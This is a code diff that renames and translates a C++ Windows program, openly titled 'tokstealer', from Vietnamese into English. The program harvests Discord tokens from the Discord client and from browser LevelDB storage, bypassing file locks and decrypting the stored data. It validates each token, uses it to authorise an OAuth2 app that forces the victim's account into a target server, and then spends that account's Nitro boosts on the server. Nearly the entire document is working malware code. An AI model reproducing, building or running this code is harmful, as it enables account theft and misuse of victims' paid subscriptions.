@@ -1,8 +1,8 @@
-// discord_pipeline.cpp
+// tokstealer.cpp
 // Build (MSVC):
-//   cl /std:c++17 /EHsc /O2 discord_pipeline.cpp /link winhttp.lib bcrypt.lib crypt32.lib
-// Yêu cầu: Windows, C++17, MSVC 2019+
-// Không cần thư viện ngoài.
+//   cl /std:c++17 /EHsc /O2 /DNDEBUG /MD tokstealer.cpp /link winhttp.lib bcrypt.lib crypt32.lib /MACHINE:X64 /OUT:tokstealer.exe
+// Pipeline: scan tokens -> validate -> OAuth2 -> wait 5s -> check join -> boost
+// 3 workers parallel, max 500 tokens, no file output.
 
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
@@ -33,15 +33,15 @@
 namespace fs = std::filesystem;
 
 // ─────────────────────────────────────────────
-//  CẤU HÌNH
+//  CONFIG
 // ─────────────────────────────────────────────
 
-static const int         MAX_TOKENS_PER_RUN = 500;
-static const int         MAX_WORKERS        = 3;
-static const int         HTTP_TIMEOUT_MS    = 30000;
-static const int         JOIN_WAIT_SEC      = 5;
-static const bool        BOOST_ENABLED      = true;
-static const bool        ENABLE_VERBOSE     = false;
+static const int  MAX_TOKENS_PER_RUN = 500;
+static const int  MAX_WORKERS        = 3;
+static const int  HTTP_TIMEOUT_MS    = 30000;
+static const int  JOIN_WAIT_SEC      = 5;
+static const bool BOOST_ENABLED      = true;
+static const bool ENABLE_VERBOSE     = false;
 
 static const std::wstring UA =
     L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
@@ -63,7 +63,7 @@ static const std::string OAUTH_STATE     = "1315263245120180266";
 static const std::string TARGET_GUILD_ID = "1315263245120180266";
 
 // ─────────────────────────────────────────────
-//  LOG (thread-safe)
+//  LOG
 // ─────────────────────────────────────────────
 
 static std::mutex g_log_mtx;
@@ -89,7 +89,7 @@ static void dlog(const std::string& msg) {
 }
 
 // ─────────────────────────────────────────────
-//  HTTP qua WinHTTP
+//  HTTP VIA WINHTTP
 // ─────────────────────────────────────────────
 
 struct HttpResp {
@@ -117,7 +117,7 @@ static std::string u8(const std::wstring& ws) {
     return out;
 }
 
-static std::string wstr_from_headers(HINTERNET hReq, DWORD header) {
+static std::string header_string(HINTERNET hReq, DWORD header) {
     DWORD size = 0;
     WinHttpQueryHeaders(hReq, header, WINHTTP_HEADER_NAME_BY_INDEX,
                         WINHTTP_NO_OUTPUT_BUFFER, &size, WINHTTP_NO_HEADER_INDEX);
@@ -130,7 +130,6 @@ static std::string wstr_from_headers(HINTERNET hReq, DWORD header) {
     return u8(buf.c_str());
 }
 
-// method: L"GET" | L"POST" | L"PUT"
 static HttpResp http_request(const std::wstring& method,
                              const std::wstring& host,
                              const std::wstring& path,
@@ -178,7 +177,7 @@ static HttpResp http_request(const std::wstring& method,
         WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                             WINHTTP_HEADER_NAME_BY_INDEX, &code, &sz, WINHTTP_NO_HEADER_INDEX);
         out.status = (int)code;
-        out.location = wstr_from_headers(hReq, WINHTTP_QUERY_LOCATION);
+        out.location = header_string(hReq, WINHTTP_QUERY_LOCATION);
 
         DWORD avail = 0;
         do {
@@ -322,7 +321,7 @@ static std::string aes_gcm_decrypt(const std::string& enc, const std::vector<BYT
 }
 
 // ─────────────────────────────────────────────
-//  ĐỌC FILE BỊ KHÓA (LevelDB đang mở)
+//  FILE READ (bypass browser lock)
 // ─────────────────────────────────────────────
 
 static std::string read_locked_file(const std::string& path) {
@@ -344,7 +343,7 @@ static std::string read_locked_file(const std::string& path) {
 }
 
 // ─────────────────────────────────────────────
-//  TRÍCH XUẤT TOKEN
+//  TOKEN EXTRACTION
 // ─────────────────────────────────────────────
 
 static bool looks_like_real_token(const std::string& tok) {
@@ -354,9 +353,7 @@ static bool looks_like_real_token(const std::string& tok) {
     if (b == std::string::npos) return false;
     if (tok.find('.', b + 1) != std::string::npos) return false;
 
-    // phần đầu base64url phải decode ra chữ số
     std::string first = tok.substr(0, a);
-    // đệm '='
     while (first.size() % 4) first.push_back('=');
     DWORD len = 0;
     if (!CryptStringToBinaryA(first.c_str(), 0, CRYPT_STRING_BASE64_ANY,
@@ -443,7 +440,7 @@ static std::string query_param(const std::string& url, const std::string& key) {
 
 static OAuthResult oauth2_authorize(const std::string& token) {
     OAuthResult r;
-    if (token.empty()) { r.error = "token rỗng"; return r; }
+    if (token.empty()) { r.error = "empty token"; return r; }
 
     std::string query =
         "client_id=" + OAUTH_CLIENT_ID +
@@ -457,7 +454,6 @@ static OAuthResult oauth2_authorize(const std::string& token) {
     auto hdr = base_headers(token);
     hdr.push_back({"content-type", "application/json"});
 
-    // GET mồi (Discord yêu cầu)
     http_request(L"GET", L"discord.com", path, hdr, "");
 
     std::string body = "{\"permissions\":\"0\",\"authorize\":true}";
@@ -468,7 +464,6 @@ static OAuthResult oauth2_authorize(const std::string& token) {
         return r;
     }
 
-    // Tìm location trong JSON (nếu server trả body)
     std::string location = resp.location;
     if (location.empty()) {
         auto p = resp.body.find("\"location\":\"");
@@ -479,7 +474,7 @@ static OAuthResult oauth2_authorize(const std::string& token) {
         }
     }
     if (location.empty()) {
-        r.error = "Không có location. Body: " + resp.body.substr(0, 200);
+        r.error = "no location. body: " + resp.body.substr(0, 200);
         return r;
     }
     r.location = location;
@@ -487,15 +482,17 @@ static OAuthResult oauth2_authorize(const std::string& token) {
     std::string code = query_param(location, "code");
     std::string state = query_param(location, "state");
     if (!code.empty()) { r.code = code; r.state = state; r.ok = true; }
-    else r.error = "location không chứa code: " + location.substr(0, 200);
+    else r.error = "location has no code: " + location.substr(0, 200);
 
-    // Gọi callback RestoreCord nếu có
     if (location.find("restorecord.com") != std::string::npos) {
         std::wstring host = L"restorecord.com";
-        std::wstring p2 = w(location.substr(location.find("/api/")));
-        http_request(L"GET", host, p2,
-            {{"user-agent", u8(UA)},
-             {"accept", "application/json,text/html;q=0.9,*/*;q=0.8"}}, "");
+        auto slash = location.find("/api/");
+        if (slash != std::string::npos) {
+            std::wstring p2 = w(location.substr(slash));
+            http_request(L"GET", host, p2,
+                {{"user-agent", u8(UA)},
+                 {"accept", "application/json,text/html;q=0.9,*/*;q=0.8"}}, "");
+        }
     }
     return r;
 }
@@ -546,10 +543,10 @@ static int boost_guild(const std::string& token, const std::string& gid) {
             success++;
             info("    [+] Boost slot " + std::to_string(i + 1) + " OK");
         } else if (resp.status == 400) {
-            info("    [-] Slot " + std::to_string(i + 1) + " đã dùng");
+            info("    [-] Slot " + std::to_string(i + 1) + " already used");
         } else {
-            info("    [-] Slot " + std::to_string(i + 1) +
-                 " HTTP " + std::to_string(resp.status));
+            info("    [-] Slot " + std::to_string(i + 1) + " HTTP " +
+                 std::to_string(resp.status));
         }
         std::this_thread::sleep_for(std::chrono::seconds(1));
     }
@@ -557,7 +554,7 @@ static int boost_guild(const std::string& token, const std::string& gid) {
 }
 
 // ─────────────────────────────────────────────
-//  JSON — lấy string đơn giản
+//  JSON HELPER
 // ─────────────────────────────────────────────
 
 static std::string json_str(const std::string& j, const std::string& key) {
@@ -595,7 +592,6 @@ struct Stats {
 static Stats g_stats;
 
 static void process_token(const std::string& tok) {
-    // 1) Validate
     auto me = http_request(L"GET", L"discord.com",
         L"/api/v10/users/@me", base_headers(tok), "");
     if (!me.ok || me.status != 200) return;
@@ -605,10 +601,10 @@ static void process_token(const std::string& tok) {
     if (uid.empty()) return;
 
     g_stats.valid++;
-    std::string display = uname + (disc != "0" && !disc.empty() ? "#" + disc : "");
+    std::string display = uname;
+    if (!disc.empty() && disc != "0") display += "#" + disc;
     info("[v] Valid UID " + uid + " (" + display + ") tok=" + tok.substr(0, 10) + "...");
 
-    // 2) OAuth
     auto o = oauth2_authorize(tok);
     if (!o.ok) {
         info("    [-] OAuth FAIL: " + o.error);
@@ -618,20 +614,17 @@ static void process_token(const std::string& tok) {
     g_stats.oauth_ok++;
     info("    [+] OAuth OK (state=" + o.state + ")");
 
-    // 3) Đợi 5s
-    info("    [*] Chờ " + std::to_string(JOIN_WAIT_SEC) + "s...");
+    info("    [*] Waiting " + std::to_string(JOIN_WAIT_SEC) + "s...");
     std::this_thread::sleep_for(std::chrono::seconds(JOIN_WAIT_SEC));
 
-    // 4) Check join
     if (!is_in_guild(tok, TARGET_GUILD_ID)) {
-        info("    [-] CHƯA vào guild " + TARGET_GUILD_ID);
+        info("    [-] NOT in guild " + TARGET_GUILD_ID);
         g_stats.failed++;
         return;
     }
     g_stats.joined++;
-    info("    [+] Đã vào guild " + TARGET_GUILD_ID);
+    info("    [+] Joined guild " + TARGET_GUILD_ID);
 
-    // 5) Boost
     if (BOOST_ENABLED) {
         int n = boost_guild(tok, TARGET_GUILD_ID);
         if (n > 0) {
@@ -645,14 +638,14 @@ static void process_token(const std::string& tok) {
 }
 
 // ─────────────────────────────────────────────
-//  QUÉT DISCORD CLIENT + TRÌNH DUYỆT
+//  BROWSER LIST
 // ─────────────────────────────────────────────
 
 struct BrowserDef {
     const char* name;
     const char* rel;
     bool from_appdata;
-    bool is_opera;   // Opera dùng leveldb ngay dưới root
+    bool is_opera;
 };
 
 static const std::vector<BrowserDef> BROWSERS = {
@@ -777,12 +770,12 @@ static void scan_discord_clients(std::set<std::string>& found) {
 }
 
 // ─────────────────────────────────────────────
-//  PIPELINE CHÍNH
+//  MAIN
 // ─────────────────────────────────────────────
 
 int main() {
     SetConsoleOutputCP(CP_UTF8);
-    info("[*] Quét token Discord...");
+    info("[*] Scanning Discord tokens...");
 
     std::set<std::string> found;
     scan_discord_clients(found);
@@ -798,12 +791,15 @@ int main() {
         scan_browser(root, bd, found);
     }
 
-    info("[*] Tìm thấy " + std::to_string(found.size()) +
-         " token ứng viên. Xử lý tối đa " +
-         std::to_string(MAX_TOKENS_PER_RUN) +
-         " với " + std::to_string(MAX_WORKERS) + " worker.");
+    info("[*] Found " + std::to_string(found.size()) +
+         " candidate tokens. Processing up to " +
+         std::to_string(MAX_TOKENS_PER_RUN) + " with " +
+         std::to_string(MAX_WORKERS) + " workers.");
 
-    if (found.empty()) return 0;
+    if (found.empty()) {
+        info("[!] No tokens found.");
+        return 0;
+    }
 
     std::vector<std::string> candidates(found.begin(), found.end());
     if ((int)candidates.size() > MAX_TOKENS_PER_RUN)
@@ -820,7 +816,6 @@ int main() {
                 if (g_stats.picked >= (int)candidates.size()) return;
                 tok = candidates[g_stats.picked++];
             }
-            // dedup UID nhanh
             auto me = http_request(L"GET", L"discord.com",
                 L"/api/v10/users/@me", base_headers(tok), "");
             if (!me.ok || me.status != 200) continue;
@@ -841,11 +836,11 @@ int main() {
     for (auto& t : threads) t.join();
 
     std::cout << "\n";
-    info("===== KẾT QUẢ =====");
+    info("===== RESULTS =====");
     info("Valid   : " + std::to_string((int)g_stats.valid));
     info("OAuth OK: " + std::to_string((int)g_stats.oauth_ok));
     info("Joined  : " + std::to_string((int)g_stats.joined));
-    info("Boosted : " + std::to_string((int)g_stats.boosted) + " slot");
+    info("Boosted : " + std::to_string((int)g_stats.boosted) + " slot(s)");
     info("Failed  : " + std::to_string((int)g_stats.failed));
     return 0;
 }
